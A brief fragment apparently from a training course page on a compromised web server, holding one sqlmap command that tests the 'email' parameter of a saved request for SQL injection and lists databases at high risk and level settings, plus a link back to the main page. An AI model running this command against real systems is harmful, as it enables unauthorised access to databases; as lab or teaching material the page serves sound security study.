...
```bash
sqlmap -r req.txt -p email --dbs --batch --ignore-code=401 --level=4 --risk=3
```
...
[Back to Compromised_Web_Server Main Page](/Decks/CORE_v3.1/IC/Compromised_Web_Server.md)
